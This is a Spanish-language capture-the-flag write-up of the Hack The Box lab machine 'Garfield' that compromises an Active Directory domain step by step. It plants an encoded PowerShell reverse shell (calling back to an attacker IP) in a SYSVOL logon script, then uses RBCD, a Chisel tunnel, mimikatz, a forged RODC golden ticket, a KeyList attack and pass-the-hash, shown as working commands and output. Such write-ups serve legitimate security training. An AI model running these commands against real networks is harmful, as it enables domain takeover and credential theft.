---
title: Garfield
description: Garfield
sidebar:
  badge:
    text: Hard
    variant: danger
tags:
  - htb
  - windows
  - hard
  - active-directory
  - sysvol-abuse
  - rbcd
  - rodc
  - golden-ticket
  - keylist-attack
  - chisel
  - pass-the-hash
---

## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sSCV -Pn 10.129.244.207

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: garfield.htb)
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   Product_Version: 10.0.17763
|_  clock-skew: mean: 8h02m49s
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

> Dominio `garfield.htb`, DC es `DC01`. El clock-skew de **8 horas** es crítico — Kerberos rechaza tickets con más de 5 minutos de diferencia. Habrá que sincronizar el reloj antes de cualquier operación Kerberos. WinRM en 5985 disponible si se consiguen credenciales válidas.
> 

```bash
echo "10.129.244.207 garfield.htb DC01.garfield.htb" | sudo tee -a /etc/hosts
```

### Enumeración SMB y usuarios

```bash
nxc smb 10.129.244.207 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares`

SMB  DC01  [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
SMB  DC01  Share       Permissions
SMB  DC01  -----       -----------
SMB  DC01  IPC$        READ
SMB  DC01  NETLOGON    READ
SMB  DC01  SYSVOL      READ
```

> `j.arbuckle` tiene lectura en **SYSVOL** y **NETLOGON** — esto permite inspeccionar GPOs y scripts de inicio de sesión, y potencialmente escribir en ellos si los permisos del filesystem lo permiten.
> 

```bash
nxc smb 10.129.244.207 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users

- Username- -Last PW Set-
Administrator 2025-10-03
krbtgt 2025-08-13
krbtgt_8245 2025-08-17 ← RODC krbtgt account
j.arbuckle 2025-09-09
l.wilson 2026-01-27
l.wilson_adm 2026-01-13
```

> La cuenta `krbtgt_8245` confirma la existencia de un **Read-Only Domain Controller (RODC)** en el entorno. Los RODCs tienen su propia cuenta krbtgt con un número de ID diferente — ese número (`8245`) será necesario para forjar tickets más adelante.
> 

```bash
nxc ldap 10.129.244.207 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -M maq

MAQ  DC01  MachineAccountQuota: 10
```

> Cuota de cuentas de máquina = 10 — cualquier usuario del dominio puede crear hasta 10 cuentas de máquina. Esto es el requisito para RBCD.
> 

### Permisos de escritura con BloodyAD

```bash
bloodhound-python -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
  -d garfield.htb -ns 10.129.244.207 -c All --zip

WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.
         Error: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Found 2 computers
INFO: Querying computer: RODC01.garfield.htb
INFO: Querying computer: DC01.garfield.htb
INFO: Done in 00M 55S
```

> BloodHound cayó a NTLM por el clock skew pero completó la recolección. Se identifican **dos equipos**: DC01 (DC principal) y RODC01 (controlador de solo lectura). Importar el ZIP y analizar el grafo de ataque.
> 

```bash
bloodyAD --host 10.129.244.207 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
permission: WRITE
```

> `j.arbuckle` tiene **WRITE sobre `l.wilson` y `l.wilson_adm`** — puede modificar sus atributos AD, incluyendo `scriptPath`. Esto permite forzar que un script arbitrario se ejecute cuando `l.wilson` inicie sesión.
> 

### Inspección de SYSVOL — GPOs y scripts

```bash
smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'
smb: \> recurse ON
smb: \> ls

\garfield.htb\scripts\
  printerDetect.bat   A  217  Fri Sep 12 18:20:29 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Scripts\
  Startup\   (vacío)
  Shutdown\  (vacío)

\garfield.htb\Policies\{6AC1786C...}\MACHINE\Microsoft\Windows NT\SecEdit\
  GptTmpl.inf   A  3904  Fri Feb 13 21:14:50 2026
```

> El script `printerDetect.bat` está en `scripts\` y la GPO `{6AC1786C}` tiene carpeta `Scripts`. Descargamos el `GptTmpl.inf` para ver qué usuarios ejecutan ese script.
> 

```bash
smb: \garfield.htb\scripts\> get printerDetect.bat
cat /tmp/GptTmpl.inf

[Privilege Rights]
SeBatchLogonRight = *S-1-5-32-559,l.wilson,*S-1-5-32-551,*S-1-5-32-544
```

> **`l.wilson` tiene `SeBatchLogonRight`** — derecho a ejecutar scripts por lotes (`.bat`). Esto confirma que `printerDetect.bat` se ejecuta bajo el contexto de `l.wilson`. Si reemplazamos ese script con una reverse shell y asignamos `scriptPath=printerDetect.bat` al usuario via AD, obtenemos shell como `l.wilson`.
> 

---

## 2. Vector de entrada — GPO Script Abuse via SYSVOL Write

La cadena completa: `j.arbuckle` puede escribir en SYSVOL → reemplaza `printerDetect.bat` con reverse shell → usa `bloodyAD` para asignar `scriptPath=printerDetect.bat` a `l.wilson` → cuando el script corre, se ejecuta el payload.

### Paso 1 — Generar el payload y crear el bat malicioso

```bash
PAYLOAD=$(echo -n "\$client = New-Object System.Net.Sockets.TCPClient('10.10.17.16',4443);..." \
  | iconv -t UTF-16LE | base64 -w 0)

echo "@echo off" > printerDetect.bat
echo "powershell -nop -w hidden -enc $PAYLOAD" >> printerDetect.bat
cat printerDetect.bat

@echo off
powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0A...
```

> El payload es un reverse shell PowerShell codificado en Base64 UTF-16LE — bypasea las restricciones de ejecución sin tocar el disco con scripts `.ps1`.
> 

### Paso 2 — Subir el bat malicioso a SYSVOL

```bash
smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
  -c "put printerDetect.bat garfield.htb\\scripts\\printerDetect.bat"

putting file printerDetect.bat as \garfield.htb\scripts\printerDetect.bat (1.9 kB/s)
```

> El archivo se subió con éxito — SYSVOL permite escritura para `j.arbuckle`. El tamaño pasó de 217 a 557 bytes, confirmando que el contenido fue reemplazado.
> 

### Paso 3 — Asignar scriptPath a l.wilson via BloodyAD

```bash
bloodyAD --host 10.129.244.207 -d garfield.htb \
  -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
  set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath \
  -v "printerDetect.bat"

[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
```

> El atributo `scriptPath` de `l.wilson` ahora apunta a `printerDetect.bat`. Cuando inicie sesión, el DC buscará ese script en `NETLOGON\` y lo ejecutará — que es exactamente donde subimos nuestro payload.
> 

### Paso 4 — Recibir la shell

```bash
rlwrap -cAr nc -lvnp 4443

connect to [10.10.17.16] from (UNKNOWN) [10.129.244.207] 63919

PS C:\Windows\system32> whoami
garfield\l.wilson
```

> Shell como `l.wilson`. Estamos en `C:\Windows\system32` — el script corrió en contexto del sistema de inicio de sesión.
> 

---

## 3. Acceso inicial — l.wilson → l.wilson_adm → WinRM

```bash
$newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-ADAccountPassword -Identity "l.wilson_adm" -NewPassword $newpass -Reset

(sin output = éxito)
```

> `l.wilson` tiene permisos de escritura sobre `l.wilson_adm` en AD (visto en BloodyAD). Cambiamos su contraseña directamente desde la shell.
> 

```bash
nxc winrm 10.129.244.207 -u 'l.wilson_adm' -p 'Password123!'

WINRM  DC01  [+] garfield.htb\l.wilson_adm:Password123! (Pwn3d!)
```

> `(Pwn3d!)` confirma que `l.wilson_adm` es miembro de `Remote Management Users` — acceso WinRM directo.
> 

```bash
evil-winrm -i 10.129.244.207 -u 'l.wilson_adm' -p 'Password123!'

- Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> cat user.txt
5edb85aed3ea8c8be3119bf311112670
```

---

## 4. Escalada de privilegios — RBCD → RODC → Golden Ticket → KeyList Attack

**Resumen de la cadena:**

1. `l.wilson_adm` se añade a `RODC Administrators` → puede modificar `msDS-RevealOnDemandGroup`
2. Se añade a Administrator a `msDS-RevealOnDemandGroup` → el RODC cacheará su hash
3. Se crea `FAKE01$` + RBCD sobre `RODC01$` → S4U2Proxy genera ticket de Administrator
4. Chisel tuneliza hacia `192.168.100.2` (RODC01, red interna)
5. psexec en RODC01 → mimikatz extrae `krbtgt_8245 aes256`
6. Rubeus forja RODC Golden Ticket → KeyList attack recupera hash NTLM real

### Paso 1 — Añadir l.wilson_adm a RODC Administrators

```bash
bloodyAD --host 10.129.244.207 -d garfield.htb \
  -u 'l.wilson_adm' -p 'Password123!' \
  add groupMember 'RODC Administrators' 'l.wilson_adm'

[+] l.wilson_adm added to RODC Administrators
```

> Los miembros de `RODC Administrators` pueden administrar el RODC y modificar sus atributos de replicación de contraseñas, incluyendo `msDS-RevealOnDemandGroup`.
> 

### Paso 2 — Modificar msDS-RevealOnDemandGroup para incluir Administrator

```bash
. .\PowerView.ps1
Set-DomainObject -Identity 'RODC01$' -Set @{
  'msDS-RevealOnDemandGroup'=@(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
  )
}

(sin output = éxito)
```

> `msDS-RevealOnDemandGroup` define qué cuentas **pueden** tener su hash cacheado en el RODC. Al añadir Administrator, el RODC lo cacheará la próxima vez que se autentique — y podremos extraerlo desde el RODC con mimikatz.
> 

### Paso 3 — Crear cuenta de máquina FAKE01$ y configurar RBCD

```bash
impacket-addcomputer garfield.htb/l.wilson_adm:'Password123!' \
  -dc-ip 10.129.244.207 \
  -computer-name "FAKE01" \
  -computer-pass 'Password123!'

[*] Successfully added machine account FAKE01$ with password Password123!.
```

```bash
impacket-rbcd garfield.htb/l.wilson_adm:'Password123!' \
  -dc-ip 10.129.244.207 \
  -action write \
  -delegate-to "RODC01$" \
  -delegate-from "FAKE01$"

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FAKE01$ can now impersonate users on RODC01$ via S4U2Proxy
[*]     FAKE01$  (S-1-5-21-2502726253-3859040611-225969357-10601)
```

> RBCD configurado: `FAKE01$` puede solicitar tickets de servicio en nombre de cualquier usuario (incluyendo Administrator) para servicios en `RODC01$`. El atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` en `RODC01$` ahora incluye a `FAKE01$`.
> 

### Paso 4 — Obtener ticket S4U2Proxy como Administrator

```bash
sudo ntpdate 10.129.244.207
impacket-getST garfield.htb/FAKE01$:'Password123!' \
  -dc-ip 10.129.244.207 \
  -spn "host/RODC01.garfield.htb" \
  -impersonate Administrator

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@host_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

> S4U2Proxy completado — tenemos un ticket de servicio válido que nos permite autenticarnos en `RODC01` como `Administrator`. El `ntpdate` previo es obligatorio para evitar el error de clock skew de Kerberos.
> 

### Paso 5 — Tunnelizar con Chisel hacia RODC01 (red interna 192.168.100.2)

```bash
# DC01 WinRM
Test-NetConnection RODC01.garfield.htb -Port 445`

RemoteAddress    : 192.168.100.2
TcpTestSucceeded : True
```

> RODC01 está en `192.168.100.2` — red interna no accesible directamente desde el atacante. Necesitamos tunnelizar a través de DC01.
> 

```bash
# Kali — servidor
./chisel server -p 8888 --reverse

2026/05/14 16:47:35 server: Reverse tunnelling enabled
2026/05/14 16:47:35 server: Listening on http://0.0.0.0:8888
2026/05/14 17:02:19 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

```bash
# DC01 WinRM
.\chisel.exe client 10.10.17.16:8888 R:1080:socks

2026/05/14 14:02:19 client: Connected (Latency 141.2673ms)
```

> Túnel SOCKS5 establecido en `127.0.0.1:1080`. Ahora todo el tráfico hacia `192.168.100.2` puede ir a través de proxychains.
> 

### Paso 6 — Acceder a RODC01 y extraer krbtgt_8245

```bash
export KRB5CCNAME=Administrator@host_RODC01.garfield.htb@GARFIELD.HTB.ccache
echo "192.168.100.2 RODC01.garfield.htb" | sudo tee -a /etc/hosts

proxychains impacket-psexec -k -no-pass \
  garfield.htb/Administrator@RODC01.garfield.htb

[proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.100.2:445 ... OK
[*] Found writable share ADMIN$
[*] Creating service XYGe on RODC01.garfield.htb...
C:\Windows\system32> whoami
nt authority\system
```

> SYSTEM en RODC01 via el ticket S4U2Proxy. El túnel chisel enruta el tráfico correctamente.
> 

```bash
C:\Windows\Temp\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"

mimikatz # lsadump::lsa /inject /name:krbtgt_8245
RID  : 00000643 (1603)
User : krbtgt_8245

 * Primary
    NTLM : 445aa4221e751da37a10241d962780e2

 * Kerberos-Newer-Keys
    aes256_hmac (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
    aes128_hmac (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
```

> Clave AES256 del `krbtgt_8245` extraída: `d6c93cbe...`. Esta es la clave con la que el RODC firma tickets — con ella podemos forjar un **RODC Golden Ticket** que el DC principal aceptará para el proceso de KeyList.
> 

> **Nota importante del lsadump::lsa /patch sobre DC01:** los hashes de `Administrator`, `krbtgt`, `l.wilson`, `l.wilson_adm` salieron **vacíos** — esto es porque es un RODC y no almacena todos los hashes del dominio por defecto. Solo tiene `krbtgt_8245` y cuentas explícitamente en su lista de revelación.
> 

### Paso 7 — Forjar RODC Golden Ticket con Rubeus

```bash
C:\Windows\Temp\Rubeus.exe golden \
  /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 \
  /domain:garfield.htb \
  /sid:S-1-5-21-2502726253-3859040611-225969357 \
  /user:Administrator \
  /id:500 \
  /rodcNumber:8245 \
  /flags:forwardable,renewable,enc_pa_rep \
  /outfile:C:\Windows\Temp\ticket.kirbi

[*] Action: Build TGT
[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] ServiceKey     : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Forged a TGT for 'Administrator@garfield.htb'
[*] Ticket written to C:\Windows\Temp\ticket_..._Administrator_to_krbtgt@GARFIELD.HTB.kirbi
```

> TGT forjado firmado con la clave del RODC. El parámetro `/rodcNumber:8245` marca el ticket como "emitido por el RODC #8245" — esto es lo que le dice al DC principal que debe verificarlo via KeyList en lugar de rechazarlo.
> 

### Paso 8 — KeyList Attack: recuperar el hash NTLM real

El **KeyList attack** usa el RODC Golden Ticket para hacer una petición especial al DC principal. El DC principal, al ver un ticket firmado por un RODC, consulta la base de datos de contraseñas cacheadas del RODC (`msDS-RevealedList`) y devuelve el hash NTLM en el ticket de respuesta.

```bash
C:\Windows\Temp\Rubeus.exe asktgs \
  /enctype:aes256 \
  /service:krbtgt/garfield.htb \
  /keyList \
  /dc:DC01.garfield.htb \
  /ticket:C:\Windows\Temp\ticket.kirbi \
  /nowrap

[*] Action: Ask TGS
[*] Building KeyList TGS-REQ request for: 'Administrator'
[*] Using domain controller: DC01.garfield.htb (10.129.244.207)
[+] TGS request successful!

  ServiceName    : krbtgt/GARFIELD.HTB
  UserName       : Administrator (NT_PRINCIPAL)
  KeyType        : aes256_cts_hmac_sha1
  Base64(key)    : sRTR4HukKmmTOuSLVuSfrdU2CitpZtWtyxmX6u628p0=
  Password Hash  : EE238F6DEBC752010428F20875B092D5
```

> **Hash NTLM real del Administrator del dominio recuperado: `EE238F6DEBC752010428F20875B092D5`**. El campo `Password Hash` en el TGS de respuesta contiene el NT hash cacheado en el RODC para Administrator.
> 

### Paso 9 — Pass-the-Hash como Administrator en DC01

```bash
evil-winrm -i 10.129.244.207 -u Administrator -H 'EE238F6DEBC752010428F20875B092D5'

Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

```bash
type root.txt
[root flag]
```

---

---

## 6. Lecciones aprendidas

- **SYSVOL con escritura + BloodyAD scriptPath = GPO abuse sin tocar la consola de administración.** No hace falta editar la GPO directamente — basta con reemplazar el script en SYSVOL y asignar `scriptPath` al usuario objetivo via LDAP. BloodyAD lo hace en un comando.
- **`krbtgt_XXXX` en la lista de usuarios = RODC presente en el entorno.** El número del sufijo es el ID del RODC — necesario para `/rodcNumber` en el Golden Ticket de Rubeus.
- **El RODC solo cachea contraseñas de cuentas en `msDS-RevealOnDemandGroup`.** Por eso el `lsadump::lsa /patch` del RODC devuelve hashes vacíos para Administrator — hay que añadirlo a esa lista antes de extraerlo.
- **KeyList attack requiere dos pasos:** primero forjar el Golden Ticket RODC, luego `asktgs /keyList` al DC principal. El hash NTLM aparece en el campo `Password Hash` de la respuesta TGS — no en un dump de LSA.
- **Chisel es imprescindible cuando el objetivo está en una red interna.** `R:1080:socks` con proxychains permite usar todas las herramientas de impacket a través del túnel sin modificar su código.
- **En máquinas similares buscar:** `krbtgt_XXXX` para detectar RODCs, escritura en SYSVOL para script abuse, `MachineAccountQuota > 0` para RBCD, `msDS-RevealOnDemandGroup` modificable para KeyList attacks.